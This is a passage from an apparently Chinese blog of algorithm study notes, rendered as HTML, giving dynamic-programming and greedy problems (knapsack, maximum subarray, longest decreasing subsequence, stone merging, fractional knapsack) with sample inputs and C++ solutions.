class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> w[<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;,v[<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">1005</span>][<span class="number">10005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> x[<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;<span class="comment">//标记作用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*构造最优解*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">output</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> cost)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = n; i&gt;<span class="number">1</span>; i--)&#123;   <span class="comment">//注意这里可能会出错</span></span><br><span class="line">        <span class="keyword">if</span>( m[i][cost] == m[i<span class="number">-1</span>][cost] ) x[i] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            x[i]= <span class="number">1</span>;</span><br><span class="line">            cost -=w[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//cout&lt;&lt;1&lt;&lt;endl;</span></span><br><span class="line">    x[<span class="number">1</span>] = m[<span class="number">1</span>][cost]?<span class="number">1</span>:<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i&lt;=n; i++)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;x[i]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;T;</span><br><span class="line">    <span class="keyword">while</span>(T--)&#123;</span><br><span class="line">            <span class="keyword">int</span> c,n;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;c&gt;&gt;n;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span> ; i&lt;= n;i++)&#123;</span><br><span class="line">                <span class="built_in">cin</span>&gt;&gt;w[i]&gt;&gt;v[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= n; i++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j =<span class="number">1</span>;j&lt;= c;j++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(j &gt;= w[i]) m[i][j] = max(m[i<span class="number">-1</span>][j],m[i<span class="number">-1</span>][j-w[i]]+v[i]);</span><br><span class="line">                    <span class="keyword">else</span> m[i][j] = m[i<span class="number">-1</span>][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;m[n][c]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">         <span class="comment">//   output(n,c);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最大子段和"><a href="#最大子段和" class="headerlink" title="最大子段和"></a>最大子段和</h3><h4 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定n个整数组成的序列a1,a2,…an, 求子段和ai+ai+1+…+aj（子段可为空集）的最大值。</p><h5 id="输入-8"><a href="#输入-8" class="headerlink" title="输入"></a>输入</h5><p>包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=20)，代表测试数据个数。</p><p>每组测试数据第一行为一个整数n，代表有n个整数(1&lt;=n&lt;=10000)。</p><p>接下来一行有n个数x(-1000&lt;=x&lt;=1000)。</p><h5 id="输出-8"><a href="#输出-8" class="headerlink" title="输出"></a>输出</h5><p>输出其对应的最大子段和。</p><h5 id="样例输入-8"><a href="#样例输入-8" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">6</span><br><span class="line">2 -11 4 13 -1 2</span><br></pre></td></tr></table></figure><h5 id="样例输出-8"><a href="#样例输出-8" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">18</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">10005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span> ; i&lt; len ;i++)&#123;</span><br><span class="line">      <span class="keyword">if</span>(k &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        k += a[i];</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        k = a[i];</span><br><span class="line">      &#125;</span><br><span class="line">        <span class="keyword">if</span>(k &gt; sum) sum = k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;T;</span><br><span class="line">    <span class="keyword">while</span>(T--)&#123;</span><br><span class="line">        <span class="keyword">int</span> n ;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;n;i++) <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">        solve(n);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="求数组的最长递减子序列"><a href="#求数组的最长递减子序列" class="headerlink" title="求数组的最长递减子序列"></a>求数组的最长递减子序列</h3><h4 id="题目描述-9"><a href="#题目描述-9" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一个整数序列，输出它的最长递减（注意不是“不递增”）子序列。</p><h5 id="输入-9"><a href="#输入-9" class="headerlink" title="输入"></a>输入</h5><p>输入包括两行，第一行包括一个正整数N（N&lt;=1000），表示输入的整数序列的长度。第二行包括用空格分隔开的N个整数，整数范围区间为[-30000,30000]。</p><h5 id="输出-9"><a href="#输出-9" class="headerlink" title="输出"></a>输出</h5><p>输出最长递减子序列，数字之间有一个空格。</p><h5 id="样例输入-9"><a href="#样例输入-9" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8</span><br><span class="line">9 4 3 2 5 4 3 2</span><br></pre></td></tr></table></figure><h5 id="样例输出-9"><a href="#样例输出-9" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9 5 4 3 2</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> num[<span class="number">205</span>];</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">205</span>];</span><br><span class="line"><span class="keyword">int</span> roud[<span class="number">205</span>];</span><br><span class="line"><span class="keyword">int</span> maxc;</span><br><span class="line"><span class="keyword">int</span> N;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">output</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x)&#123;</span><br><span class="line">output(roud[x]);</span><br><span class="line"><span class="keyword">if</span>(maxc != x) <span class="built_in">cout</span>&lt;&lt;num[x]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;num[x]&lt;&lt;<span class="built_in">endl</span>; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;N;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i= <span class="number">1</span> ; i&lt;= N; i++) <span class="built_in">cin</span>&gt;&gt;num[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span> ; i &lt;= N ; i++)&#123;</span><br><span class="line">dp[i] = <span class="number">1</span>;</span><br><span class="line">roud[i] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span> ; j &lt; i; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(num[j] &gt; num[i] &amp;&amp; dp[i] &lt; dp[j] +<span class="number">1</span> )&#123;</span><br><span class="line">dp[i] = dp[j] +<span class="number">1</span> ;</span><br><span class="line">roud[i] = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(dp[i] &gt; dp[maxc])&#123;</span><br><span class="line">maxc = i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">output(maxc);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="沙子的质量"><a href="#沙子的质量" class="headerlink" title="沙子的质量"></a>沙子的质量</h3><p>题目描述<br>设有N堆沙子排成一排，其编号为1，2，3，…，N（N&lt; =300）。每堆沙子有一定的数量，可以用一个整数来描述，现在要将N堆沙子合并成为一堆，每次只能合并相邻的两堆，合并的代价为这两堆沙子的数量之和，合并后与这两堆沙子相邻的沙子将和新堆相邻，合并时由于选择的顺序不同，合并的总代价也不相同，如有4堆沙子分别为1 3 5 2我们可以先合并1、2堆，代价为4，得到4 5 2又合并1，2堆，代价为9，得到9 2，再合并得到11，总代价为4+9+11=24，如果第二步是先合并2，3堆，则代价为7，得到4 7，最后一次合并代价为11，总代价为4+7+11=22；问题是：找出一种合理的方法，使总的代价最小。输出最小代价。</p><h5 id="输入-10"><a href="#输入-10" class="headerlink" title="输入"></a>输入</h5><p>第一行一个数N表示沙子的堆数N。 第二行N个数，表示每堆沙子的质量。 a[i]&lt; =1000。</p><h5 id="输出-10"><a href="#输出-10" class="headerlink" title="输出"></a>输出</h5><p>合并的最小代价。</p><h5 id="样例输入-10"><a href="#样例输入-10" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">1 3 5 2</span><br></pre></td></tr></table></figure><h5 id="样例输出-10"><a href="#样例输出-10" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">22</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">105</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">305</span>][<span class="number">305</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*这个题目就是另类的矩阵连乘*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i= <span class="number">1</span>; i &lt;= n;i++) &#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">a[i] += a[i<span class="number">-1</span>];</span><br><span class="line">m[i][i] = <span class="number">0</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> r =<span class="number">2</span>; r&lt;=n;r++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n-r+<span class="number">1</span>; i++ )&#123;</span><br><span class="line"><span class="keyword">int</span>  j = i+r<span class="number">-1</span>;</span><br><span class="line">m[i][j] = m[i+<span class="number">1</span>][j]+a[j]-a[i<span class="number">-1</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k = i+<span class="number">1</span>; k&lt;j; k++)&#123;</span><br><span class="line">m[i][j] = min(m[i][j],m[i][k]+m[k+<span class="number">1</span>][j]+a[j]-a[i<span class="number">-1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;m[<span class="number">1</span>][n]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="节食的限制"><a href="#节食的限制" class="headerlink" title="节食的限制"></a>节食的限制</h3><h4 id="题目描述-10"><a href="#题目描述-10" class="headerlink" title="题目描述"></a>题目描述</h4><p>Bessie像她的诸多姊妹一样，因為从Farmer John的草地吃了太多美味的草而长出了太多的赘肉。所以FJ将她置於一个及其严格的节食计划之中。她每天不能吃多过H(5&lt;=H&lt;=45000)公斤的乾草。Bessie只能吃一整綑乾草；当她开始吃一綑乾草的之后就再也停不下来了。她有一个完整的N(1&lt;=n&lt;=50)綑可以给她当作晚餐的乾草的清单。她自然想要尽量吃到更多的乾草。很自然地，每綑乾草只能被吃一次（即使在列表中相同的重量可能出现2次，但是这表示的是两綑乾草，其中每綑乾草最多只能被吃掉一次）。 给定一个列表表示每綑乾草的重量Si(1&lt;=Si&lt;=H),求Bessie不超过节食的限制的前提下可以吃掉多少乾草（注意一旦她开始吃一綑乾草就会把那一綑乾草全部吃完）。</p><h5 id="输入-11"><a href="#输入-11" class="headerlink" title="输入"></a>输入</h5><p>第一行：两个由空格隔开的整数：H和N， 第2到N+1行：第i+1行是一个单独的整数，表示第i綑乾草的重量Si。</p><h5 id="输出-11"><a href="#输出-11" class="headerlink" title="输出"></a>输出</h5><p>一个单独的整数表示Bessie在限制范围内最多可以吃多少公斤的乾草。</p><h5 id="样例输入-11"><a href="#样例输入-11" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">56 4</span><br><span class="line">15</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td></tr></table></figure><h5 id="样例输出-11"><a href="#样例输出-11" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">56</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">50</span>][<span class="number">45000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> w[<span class="number">50</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*本质就是01背包*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> h,n;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;h&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;= n; i++)<span class="built_in">cin</span>&gt;&gt;w[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i&lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span> ; j&lt;=h; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(j &gt;= w[i]) m[i][j]=max(m[i<span class="number">-1</span>][j],m[i<span class="number">-1</span>][j-w[i]]+w[i]);</span><br><span class="line"><span class="keyword">else</span> m[i][j] = m[i<span class="number">-1</span>][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;m[n][h]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="贪心法"><a href="#贪心法" class="headerlink" title="贪心法"></a>贪心法</h2><p>这类题目记得先排序，按怎样的顺序排，自己看清题目</p><h3 id="homework"><a href="#homework" class="headerlink" title="homework"></a>homework</h3><h4 id="题目描述-11"><a href="#题目描述-11" class="headerlink" title="题目描述"></a>题目描述</h4><p>临近开学了，大家都忙着收拾行李准  备返校，但 I_Love_C 却不为此担心! 因为他的心思全在暑假作业上：目前为止还未开动。</p><p>暑假作业是很多张试卷，我们这些从试卷里爬出来的人都知道，卷子上的题目有选择题、填空题、简答题、证明题等。而做选择题的好处就在于工作量很少，但又因为选择题题目都普遍很长。如果有 5 张试卷，其中 4 张是选择题，最后一张是填空题，很明显做最后一张所花的时间要比前 4 张长很多。但如果你只做了选择题，虽然工作量很少，但表面上看起来也已经做了4/5的作业了。</p><p>I_Love_C决定就用这样的方法来蒙混过关，他统计出了做完每一张试卷所需的时间以及它做完后能得到的价值（按上面的原理，选择题越多价值当然就越高咯）。</p><p>现在就请你帮他安排一下，用他仅剩的一点时间来做最有价值的作业。</p><h5 id="输入-12"><a href="#输入-12" class="headerlink" title="输入"></a>输入</h5><p>测试数据包括多组。每组测试数据以两个整数 M,N(1&lt;M&lt;20,1&lt;N&lt;10000) 开头，分别表示试卷的数目和 I_Love_C 剩下的时间。接下来有 M 行，每行包括两个整数 T,V(1&lt;T&lt;N,1&lt;V&lt;10000)分别表示做完这张试卷所需的时间以及做完后能得到的价值，输入以 0 0 结束。</p><h5 id="输出-12"><a href="#输出-12" class="headerlink" title="输出"></a>输出</h5><p>对应每组测试数据输出 I_Love_C 能获得的最大价值。保留小数点 2 位</p><p>提示：float 的精度可能不够，你应该使用 double 类型。</p><h5 id="样例输入-12"><a href="#样例输入-12" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">4 20</span><br><span class="line">4 10</span><br><span class="line">5 22</span><br><span class="line">10 3</span><br><span class="line">1 2</span><br><span class="line">0 0</span><br></pre></td></tr></table></figure><h5 id="样例输出-12"><a href="#样例输出-12" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">37.00</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work</span>&#123;</span></span><br><span class="line"><span class="keyword">double</span> t,v;</span><br><span class="line"><span class="keyword">double</span> <span class="keyword">v_t</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(work a, work b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.<span class="keyword">v_t</span> &gt; b.<span class="keyword">v_t</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> m,n;</span><br><span class="line">work w[<span class="number">105</span>];</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;m&gt;&gt;n &amp;&amp; (m!=<span class="number">0</span> &amp;&amp; n != <span class="number">0</span>))&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span> ; i&lt;m ;i++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;w[i].t&gt;&gt;w[i].v;</span><br><span class="line">w[i].<span class="keyword">v_t</span> = w[i].v/w[i].t;</span><br><span class="line">&#125;</span><br><span class="line">sort(w,w+m,cmp);</span><br><span class="line"><span class="keyword">double</span> k =<span class="number">0</span>,<span class="keyword">p_t</span> =<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>; i&lt;m ;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">p_t</span> + w[i].t &lt;= n)&#123;</span><br><span class="line"><span class="keyword">p_t</span> += w[i].t;</span><br><span class="line">k += w[i].v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">p_t</span> &lt; n)&#123;</span><br><span class="line">k += (n - <span class="keyword">p_t</span>)*w[i].<span class="keyword">v_t</span>;</span><br><span class="line"><span class="keyword">p_t</span> = n;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.2lf"</span>,k);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="区间包含问题"><a href="#区间包含问题" class="headerlink" title="区间包含问题"></a>区间包含问题</h3><h4 id="题目描述-12"><a href="#题目描述-12" class="headerlink" title="题目描述"></a>题目描述</h4><p>已知 n 个左闭右开区间 [a,b)，对其进行 m 次询问，求区间[l,r]最多可以包含 n 个区间中的多少个区间，并且被包含的所有区间都不相交。</p><h5 id="输入-13"><a href="#输入-13" class="headerlink" title="输入"></a>输入</h5><p>输入包含多组测试数据，对于每组测试数据：</p><p>第一行包含两个整数 n ,m (1≤n≤100000,1≤m≤100) 。</p><p>接下来 n 行每行包含两个整数 a ,b (0≤ a&lt; b≤ 10^9) 。</p><p>接下来 m 行每行包含两个整数 l ,r (0≤ l&lt; r≤ 10^9)  。</p><h5 id="输出-13"><a href="#输出-13" class="headerlink" title="输出"></a>输出</h5><p>对于每组测试数据，输出 m 行，每行包含一个整数。</p><h5 id="样例输入-13"><a href="#样例输入-13" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">4 3</span><br><span class="line">1 3</span><br><span class="line">2 4</span><br><span class="line">1 4</span><br><span class="line">1 2</span><br><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">1 4</span><br></pre></td></tr></table></figure><h5 id="样例输出-13"><a href="#样例输出-13" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 